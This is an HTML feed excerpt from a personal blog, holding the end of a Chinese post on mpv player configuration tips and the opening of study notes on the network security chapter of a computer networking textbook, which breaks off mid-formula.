<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">nohup</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #D7DBE0">$@</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">&lt;</span><span style="color: #ECC48D">/dev/null</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">&gt;</span><span style="color: #ECC48D">/dev/null</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">2&gt;</span><span style="color: #ECC48D">/dev/null</span><span style="color: #D6DEEB"> &amp;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">disown</span></span>
<span><span style="color: #D6DEEB">}</span></span>
<span><span style="color: #C792EA">alias</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">bk</span><span style="color: #C792EA">=</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">bk_noalias </span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">  </span><span style="color: #637777"># alias 末尾空格可以继续接 alias</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #4876D6">bk_noalias</span><span style="color: #403F53">() {</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">nohup</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #403F53">$@</span><span style="color: #111111">&quot;</span><span style="color: #403F53"> </span><span style="color: #0C969B">&lt;</span><span style="color: #4876D6">/dev/null</span><span style="color: #403F53"> </span><span style="color: #0C969B">&gt;</span><span style="color: #4876D6">/dev/null</span><span style="color: #403F53"> </span><span style="color: #0C969B">2&gt;</span><span style="color: #4876D6">/dev/null</span><span style="color: #403F53"> &amp;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">disown</span></span>
<span><span style="color: #403F53">}</span></span>
<span><span style="color: #994CC3">alias</span><span style="color: #403F53"> </span><span style="color: #4876D6">bk</span><span style="color: #994CC3">=</span><span style="color: #111111">&#39;</span><span style="color: #C96765">bk_noalias </span><span style="color: #111111">&#39;</span><span style="color: #403F53">  </span><span style="color: #989FB1"># alias 末尾空格可以继续接 alias</span></span></code></pre></div></section>
<h2 id="杂项" class="heading"><a href="#杂项" class="heading-anchor" aria-label="章节： 杂项" tabindex="-1"></a><span>杂项</span></h2>
<h3 id="osc" class="heading"><a href="#osc" class="heading-anchor" aria-label="章节： OSC" tabindex="-1"></a><span>OSC</span></h3>
<p>显示总时长而非剩余时长<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-68"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-68--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #637777"># script-opts/osc.conf</span></span>
<span></span>
<span><span style="color: #C792EA">timetotal</span><span style="color: #D6DEEB">=yes</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #989FB1"># script-opts/osc.conf</span></span>
<span></span>
<span><span style="color: #994CC3">timetotal</span><span style="color: #403F53">=yes</span></span></code></pre></div></section>
<p>全屏时移动鼠标显示 OSC<span class="mojikumi-line-end">，</span>非全屏时一直显示且不遮挡画面<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-69"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-69--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #637777"># script-opts/osc.conf</span></span>
<span></span>
<span><span style="color: #637777"># it does nothing when visibility is not always</span></span>
<span><span style="color: #C792EA">boxvideo</span><span style="color: #D6DEEB">=yes</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #989FB1"># script-opts/osc.conf</span></span>
<span></span>
<span><span style="color: #989FB1"># it does nothing when visibility is not always</span></span>
<span><span style="color: #994CC3">boxvideo</span><span style="color: #403F53">=yes</span></span></code></pre></div></section>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-70"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-70--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #637777"># mpv.conf</span></span>
<span></span>
<span><span style="color: #D6DEEB">[osc-not-fullscreen]</span></span>
<span><span style="color: #C792EA">profile-cond</span><span style="color: #D6DEEB">=not fullscreen</span></span>
<span><span style="color: #C792EA">script-opts</span><span style="color: #D6DEEB">=</span><span style="color: #C792EA">osc-visibility</span><span style="color: #D6DEEB">=always</span></span>
<span></span>
<span><span style="color: #D6DEEB">[osc-fullscreen]</span></span>
<span><span style="color: #C792EA">profile-cond</span><span style="color: #D6DEEB">=fullscreen</span></span>
<span><span style="color: #C792EA">script-opts</span><span style="color: #D6DEEB">=</span><span style="color: #C792EA">osc-visibility</span><span style="color: #D6DEEB">=auto</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #989FB1"># mpv.conf</span></span>
<span></span>
<span><span style="color: #403F53">[osc-not-fullscreen]</span></span>
<span><span style="color: #994CC3">profile-cond</span><span style="color: #403F53">=not fullscreen</span></span>
<span><span style="color: #994CC3">script-opts</span><span style="color: #403F53">=</span><span style="color: #994CC3">osc-visibility</span><span style="color: #403F53">=always</span></span>
<span></span>
<span><span style="color: #403F53">[osc-fullscreen]</span></span>
<span><span style="color: #994CC3">profile-cond</span><span style="color: #403F53">=fullscreen</span></span>
<span><span style="color: #994CC3">script-opts</span><span style="color: #403F53">=</span><span style="color: #994CC3">osc-visibility</span><span style="color: #403F53">=auto</span></span></code></pre></div></section>
<h3 id="autoload" class="heading"><a href="#autoload" class="heading-anchor" aria-label="章节： autoload" tabindex="-1"></a><span>autoload</span></h3>
<p>打开一个文件时自动加载同目录下的其他文件<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Shell 代码块" data-v-ad49d235>Shell</h4><ile-root id="ile-71"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-71--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #82AAFF">ln</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">-s</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">/usr/share/mpv/scripts/autoload.lua</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">~/.config/mpv/scripts/</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #4876D6">ln</span><span style="color: #403F53"> </span><span style="color: #4876D6">-s</span><span style="color: #403F53"> </span><span style="color: #4876D6">/usr/share/mpv/scripts/autoload.lua</span><span style="color: #403F53"> </span><span style="color: #4876D6">~/.config/mpv/scripts/</span></span></code></pre></div></section>
<p><span class="mojikumi-line-start">（</span>其实 playlistmanager 也可以启用这个功能<span class="mojikumi-line-end">，</span>只不过官方有维护 <code>autoload<wbr>.<wbr>lua</code> 就用官方的吧<span class="mojikumi">。</span><span class="mojikumi-line-end">）</span></p>
<h3 id="自动找-track" class="heading"><a href="#自动找-track" class="heading-anchor" aria-label="章节： 自动找 track" tabindex="-1"></a><span>自动找 track</span></h3>
<p>模糊匹配字幕和音轨文件<span class="mojikumi">：</span><wbr><span class="mojikumi-line-start">（</span>实际上也没有多 fuzzy<span class="mojikumi-line-end">，</span>只是部分匹配而已<span class="mojikumi-line-end">）</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-72"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-72--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">sub-auto</span><span style="color: #D6DEEB">=fuzzy</span></span>
<span><span style="color: #C792EA">audio-file-auto</span><span style="color: #D6DEEB">=fuzzy</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">sub-auto</span><span style="color: #403F53">=fuzzy</span></span>
<span><span style="color: #994CC3">audio-file-auto</span><span style="color: #403F53">=fuzzy</span></span></code></pre></div></section>
<h3 id="osd" class="heading"><a href="#osd" class="heading-anchor" aria-label="章节： OSD" tabindex="-1"></a><span>OSD</span></h3>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-73"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-73--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">osd-on-seek</span><span style="color: #D6DEEB">=msg-bar</span></span>
<span><span style="color: #C792EA">osd-playing-msg</span><span style="color: #D6DEEB">=</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">File: ${filename}</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #C792EA">osd-duration</span><span style="color: #D6DEEB">=2000</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">osd-on-seek</span><span style="color: #403F53">=msg-bar</span></span>
<span><span style="color: #994CC3">osd-playing-msg</span><span style="color: #403F53">=</span><span style="color: #111111">&quot;</span><span style="color: #C96765">File: ${filename}</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #994CC3">osd-duration</span><span style="color: #403F53">=2000</span></span></code></pre></div></section>
<p>快进后退的时候显示一下具体位置<span class="mojikumi-line-end">；</span>切换文件时显示一下文件名<span class="mojikumi-line-end">；</span>显示久一点<span class="mojikumi-line-end">。</span></p>
<h3 id="截图" class="heading"><a href="#截图" class="heading-anchor" aria-label="章节： 截图" tabindex="-1"></a><span>截图</span></h3>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-74"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-74--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">screenshot-directory</span><span style="color: #D6DEEB">=~/screenshots</span></span>
<span><span style="color: #C792EA">screenshot-template</span><span style="color: #D6DEEB">=</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">%F - %P - %#01n</span><span style="color: #D9F5DD">&quot;</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">screenshot-directory</span><span style="color: #403F53">=~/screenshots</span></span>
<span><span style="color: #994CC3">screenshot-template</span><span style="color: #403F53">=</span><span style="color: #111111">&quot;</span><span style="color: #C96765">%F - %P - %#01n</span><span style="color: #111111">&quot;</span></span></code></pre></div></section>
<p>截图文件名是视频文件名 + 时间戳 + 版本<span class="mojikumi-line-start">（</span>有了版本可以同一个位置截多张图<span class="mojikumi-line-end">，</span>进行对比<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<h3 id="暂停图标" class="heading"><a href="#暂停图标" class="heading-anchor" aria-label="章节： 暂停图标" tabindex="-1"></a><span>暂停图标</span></h3>
<p>试过在暂停的时候显示一个图标<span class="mojikumi-line-end">，</span>后来还是觉得去掉好一点<span class="mojikumi-line-end">，</span>改成了 <code>osd-msg cycle pause</code><span class="mojikumi-line-end">。</span></p>
<p>想要的话可以参考 <a href="https://github.com/mpv-player/mpv/issues/8155#issuecomment-707726802">@CogentRedTester - OSD-info when video is paused</a><span class="mojikumi-line-end">。</span>需要注意的是这里用到了 <span class="mojikumi">“</span>⏸<span class="mojikumi">”</span><span class="mojikumi-line-end">，</span>而 color emoji 会显示为乱码<span class="mojikumi-line-end">，</span>只能用 monochrome emoji<span class="mojikumi-line-end">，</span>可以装一个 Noto Emoji Monochrome 加在 fontconfig 里<span class="mojikumi-line-end">。</span></p>
<h3 id="在线播放" class="heading"><a href="#在线播放" class="heading-anchor" aria-label="章节： 在线播放" tabindex="-1"></a><span>在线播放</span></h3>
<p>mpv 使用了 yt-dlp<span class="mojikumi-line-end">，</span>可以直接播放很多视频网站的视频/直播<span class="mojikumi-line-end">，</span>yt-dlp 还可以直接从浏览器获取 Cookies<span class="mojikumi-line-end">：</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-75"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-75--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">ytdl-raw-options</span><span style="color: #D6DEEB">=</span><span style="color: #C792EA">cookies-from-browser</span><span style="color: #D6DEEB">=firefox</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">ytdl-raw-options</span><span style="color: #403F53">=</span><span style="color: #994CC3">cookies-from-browser</span><span style="color: #403F53">=firefox</span></span></code></pre></div></section>
<h3 id="wakatime" class="heading"><a href="#wakatime" class="heading-anchor" aria-label="章节： WakaTime" tabindex="-1"></a><span>WakaTime</span></h3>
<p><a href="https://github.com/ouuan/dotfiles/blob/master/.config/mpv/scripts/wakatime.lua"><code>wakatime<wbr>.<wbr>lua</code></a></p>
<p>有点逆天<span class="mojikumi-line-end">，</span>但是怎么不行呢（<span class="mojikumi">（</span></p>
<p>本来是想着写个记录播放历史<span class="mojikumi-line-end">，</span>但感觉有点肝不动<span class="mojikumi-line-end">，</span>然后想到了 WakaTime<span class="mojikumi-line-start">（</span></p>
<p>和记录代码不用同一个账号就不会污染数据了<span class="mojikumi-line-end">，</span>可以建个新文件夹作为 mpv 的 <code>WAKATIME_<wbr>HOME</code><span class="mojikumi-line-end">。</span></p>
<h3 id="拆分-mpv-conf" class="heading"><a href="#拆分-mpv-conf" class="heading-anchor" aria-label="章节： 拆分 mpv.conf" tabindex="-1"></a><span>拆分 <code>mpv.conf</code></span></h3>
<p>配置都写在一起感觉最大的问题在于 profile 要写最底下<span class="mojikumi-line-end">，</span>导致不能把不同板块的配置完全拆开<span class="mojikumi-line-end">。</span>可以用 <code>include</code> 来拆成多个配置文件<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="INI 代码块" data-v-ad49d235>INI</h4><ile-root id="ile-76"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-76--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">include</span><span style="color: #D6DEEB">=~~home/conf.d/output.conf</span></span>
<span><span style="color: #C792EA">include</span><span style="color: #D6DEEB">=~~home/conf.d/playmode.conf</span></span>
<span><span style="color: #C792EA">include</span><span style="color: #D6DEEB">=~~home/conf.d/osc.conf</span></span>
<span><span style="color: #D6DEEB">...</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">include</span><span style="color: #403F53">=~~home/conf.d/output.conf</span></span>
<span><span style="color: #994CC3">include</span><span style="color: #403F53">=~~home/conf.d/playmode.conf</span></span>
<span><span style="color: #994CC3">include</span><span style="color: #403F53">=~~home/conf.d/osc.conf</span></span>
<span><span style="color: #403F53">...</span></span></code></pre></div></section>
<p>注意 <code>~~home/</code> 是 mpv home<span class="mojikumi-line-end">，</span><code>~/</code> 才是 <code>$HOME</code><span class="mojikumi-line-end">。</span></p>
<h4 id="directory-specific-config" class="heading"><a href="#directory-specific-config" class="heading-anchor" aria-label="章节： directory-specific config" tabindex="-1"></a><span>directory-specific config</span></h4>
<p><a href="https://github.com/ouuan/dotfiles/blob/master/.config/mpv/scripts/exrc.lua"><code>exrc.lua</code></a><span class="mojikumi-line-start">（</span>写得比较粗糙<span class="mojikumi-line-end">，</span>能用就行<span class="mojikumi-line-start">（</span></p>
<p>mpv 提供了 <a href="https://mpv.io/manual/stable/#file-specific-configuration-files"><span class="mojikumi-line-start">“</span>File-specific Configuration Files<span class="mojikumi-line-end">”</span></a> 功能<span class="mojikumi-line-end">，</span>但是它不安全<span class="mojikumi-line-end">。</span>受 <a href="https://github.com/neovim/neovim/issues/20911">More secure .exrc (.nvimrc) handling · Issue #20911 · neovim/neovim</a> 启发<span class="mojikumi-line-end">，</span>可以在加载 exrc 前询问用户<span class="mojikumi-line-end">。</span></p>
<p><span class="mojikumi-line-start">（</span>我是学日语的时候听教材音频<span class="mojikumi-line-end">，</span>想自动切成单曲循环<span class="mojikumi">。</span><span class="mojikumi-line-end">）</span></p>]]></content:encoded>
            <category domain="https://ouuan.moe/tag/mpv">mpv</category>
            <category domain="https://ouuan.moe/tag/Arch%20Linux">Arch Linux</category>
            <category domain="https://ouuan.moe/tag/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB">经验分享</category>
        </item>
        <item>
            <title><![CDATA[CNATDA 第八章学习笔记]]></title>
            <link>https://ouuan.moe/post/2023/07/cnatda-8</link>
            <guid>https://ouuan.moe/post/2023/07/cnatda-8</guid>
            <pubDate>Tue, 18 Jul 2023 14:32:44 GMT</pubDate>
            <description><![CDATA[<p><span class="mojikumi-line-start">《</span>Computer Networking: A Top-Down Approach (8th Edition)<span class="mojikumi-line-end">》</span>第八章 <span class="mojikumi">“</span>Security in Computer Networks<span class="mojikumi">”</span> 的学习笔记<span class="mojikumi-line-end">。</span></p>
]]></description>
            <content:encoded><![CDATA[<p><span class="mojikumi-line-start">《</span>Computer Networking: A Top-Down Approach (8th Edition)<span class="mojikumi-line-end">》</span>第八章 <span class="mojikumi">“</span>Security in Computer Networks<span class="mojikumi">”</span> 的学习笔记<span class="mojikumi-line-end">。</span></p>

<h2 id="what-is-network-security" class="heading"><a href="#what-is-network-security" class="heading-anchor" aria-label="章节： What Is Network Security?" tabindex="-1"></a><span>What Is Network Security?</span></h2>
<p><i>secure communication</i> 有下列性质<span class="mojikumi-line-end">：</span></p>
<ul>
<li>confidentiality: 由于通信可以被拦截<span class="mojikumi-line-end">，</span>保密意味着需要以某种方式加密</li>
<li>message integrity: 保证消息未被修改</li>
<li>end-point authentication: 能够确认对方的身份</li>
<li>operational security: 保护 organization network 不被攻击</li>
</ul>
<p>intruder 可以对 message 进行 eavesdropping<span class="mojikumi-line-end">、</span>modification<span class="mojikumi-line-end">、</span>insertion<span class="mojikumi-line-end">、</span>deletion<span class="mojikumi-line-end">，</span>进而实现各种攻击<span class="mojikumi-line-end">。</span></p>
<p>在网络中<span class="mojikumi-line-end">，</span>需要进行 secure communication 的双方可能是两个人类用户<span class="mojikumi-line-end">、</span>可能是 client 和 server<span class="mojikumi-line-end">、</span>可能是两个 router……</p>
<p>security functionality 可以在网络的各个 layer 提供<span class="mojikumi-line-end">。</span>虽然底层的 security 看起来覆盖了高层的 security<span class="mojikumi-line-end">，</span>但并非完全如此<span class="mojikumi-line-end">，</span>例如 IP-layer security 不能区分 IP address 相同的多个用户<span class="mojikumi-line-end">。</span>并且<span class="mojikumi-line-end">，</span>底层协议的更新<span class="mojikumi-line-end">、</span>普及相对更慢<span class="mojikumi-line-end">，</span>在上层采取措施可以更快生效<span class="mojikumi-line-end">。</span></p>
<h2 id="principles-of-cryptography" class="heading"><a href="#principles-of-cryptography" class="heading-anchor" aria-label="章节： Principles of Cryptography" tabindex="-1"></a><span>Principles of Cryptography</span></h2>
<p>plaintext (cleartext) 经 encryption algorithm 得到 ciphertext<span class="mojikumi-line-end">，</span>由 decryption algorithm 回到 plaintext<span class="mojikumi-line-end">。</span></p>
<p>encryption algorithm 一般是公开的<span class="mojikumi-line-end">，</span>为了达到保密的效果<span class="mojikumi-line-end">，</span>还需要使用 key<span class="mojikumi-line-end">。</span>设 plaintext 是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></span><span class="mojikumi-line-end">，</span>sender 使用 key <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">K_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 进行 encrypt 得到 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>A</mi></msub><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">K_A(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span></span><span class="mojikumi-line-end">，</span>receiver 使用 key <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">K_B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 进行 decrypt 得到 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>B</mi></msub><mo stretchy="false">(</mo><msub><mi>K</mi><mi>A</mi></msub><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">K_B(K_A(m)) = m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></span><span 